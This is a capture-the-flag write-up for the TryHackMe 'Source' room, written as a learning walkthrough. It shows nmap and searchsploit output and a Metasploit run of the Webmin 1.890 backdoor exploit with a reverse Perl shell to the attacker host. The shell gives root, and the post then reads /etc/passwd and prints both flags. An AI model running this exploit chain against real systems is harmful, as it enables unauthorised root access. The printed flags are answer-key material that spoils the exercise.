---
title: "TryHackMe - Source"
classes: wide
search: false
categories: 
  - TryHackMe
last_modified_at: 2020-07-08T15:58:26+08:00
toc: true
toc_label: "Contents"
---

![4d0c40b22a8df7d858f324a32b6fcbe3.png](/assets/images/thm-source/86a06c335d734cf4a28f78f669cbb325.png)

Description about this room from THM
> This virtual machine is also included in the room AttackerKB as part of a guided experience. Additionally, you can download the OVA of Source for offline usage from https://www.darkstar7471.com/resources.html

## Summary

This room is an easy to exploit and get the root access. In this machine we will learn about how to find the vulnerability using `searchploit` and how to use metaploit to get a shell from target, analyze `webmin` old version exploitation.

## Network Scanning

For network scanning we use nmap with all information.

```
┌─[twseptian@twsterlab] - [~/lab/THM/rooms/source] - [Wed Jul 08, 21:36]
└─[$]> sudo nmap -sC -sV -T4 -A -oN source.nmap 10.10.1.250
[sudo] password for twseptian: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 21:36 WIB
Nmap scan report for 10.10.1.250
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/8%OT=22%CT=1%CU=41131%PV=Y%DS=2%DC=T%G=Y%TM=5F05DA38
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%TS=C)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F
OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW
OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   319.19 ms 10.9.0.1
2   319.35 ms 10.10.1.250

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.59 seconds
```

check vulnerability using option `--script vuln`

```
┌─[twseptian@twsterlab] - [~/lab/THM/rooms/source] - [Wed Jul 08, 21:37]
└─[$]> sudo nmap -Pn --script vuln 10.10.1.250
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 21:38 WIB
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.44% done; ETC: 21:39 (0:00:00 remaining)
Nmap scan report for 10.10.1.250
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
10000/tcp open  snet-sensor-mgmt
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       http://www.exploit-db.com/exploits/1997/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_sslv2-drown: 

Nmap done: 1 IP address (1 host up) scanned in 63.75 seconds
```

## Enumeration

searchploit webmin

```
┌─[twseptian@twsterlab] - [~/lab/THM/rooms/source] - [Wed Jul 08, 21:39]
└─[$]> searchsploit webmin
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                     | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                    | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                            | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                                   | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                         | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                             | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                                  | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                                        | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                                  | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                               | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                             | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                              | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                   | linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                                                                           | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                                 | multiple/remote/2017.pl
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                                  | multiple/remote/1997.php
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                       | linux/webapps/47330.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## Explotation using metasploit

```
msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec

msf5 > use exploit/linux/http/webmin_backdoor
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.112.129
rhosts => 10.10.112.129
msf5 exploit(linux/http/webmin_backdoor) > set lhost 10.9.19.3
lhost => 10.9.19.3
msf5 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf5 exploit(linux/http/webmin_backdoor) > show options 

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.112.129    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.19.3        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.9.19.3:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.9.19.3:4444 -> 10.10.112.129:51590) at 2020-07-08 23:10:30 +0700

id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty;pty.spawn('/bin/bash')"
root@source:/usr/share/webmin/# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
dark:x:1000:1000:Dark:/home/dark:/bin/bash
root@source:/usr/share/webmin/# cd /home/dark
cd /home/dark
root@source:/home/dark# ls -la
ls -la
total 15228
drwxr-xr-x 5 dark dark     4096 Jun 26 04:46 .
drwxr-xr-x 3 root root     4096 Jun 26 04:37 ..
-rw------- 1 dark dark        7 Jun 26 04:46 .bash_history
-rw-r--r-- 1 dark dark      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dark dark     3771 Apr  4  2018 .bashrc
drwx------ 2 dark dark     4096 Jun 26 04:38 .cache
drwx------ 3 dark dark     4096 Jun 26 04:38 .gnupg
drwxrwxr-x 3 dark dark     4096 Jun 26 04:43 .local
-rw-r--r-- 1 dark dark      807 Apr  4  2018 .profile
-rw-r--r-- 1 dark dark        0 Jun 26 04:38 .sudo_as_admin_successful
-rw-rw-r-- 1 dark dark       29 Jun 26 04:44 user.txt
-rw-rw-r-- 1 dark dark 15550066 Jun 26 04:18 webmin_1.890_all.deb
root@source:/home/dark# cat user.txt
cat user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
root@source:/home/dark# cd /root
cd /root
root@source:~# ls -la 
ls -la
total 36
drwx------  5 root root 4096 Jun 26 04:46 .
drwxr-xr-x 24 root root 4096 Jun 26 04:42 ..
-rw-------  1 root root   44 Jun 26 04:46 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Jun 26 04:47 .gnupg
drwxr-xr-x  3 root root 4096 Jun 26 04:46 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jun 26 04:37 .ssh
-rw-r--r--  1 root root   25 Jun 26 04:46 root.txt
root@source:~# cat root.txt
cat root.txt
THM{UPDATE_YOUR_INSTALL}
root@source:~#
```
root flag
`THM{UPDATE_YOUR_INSTALL}`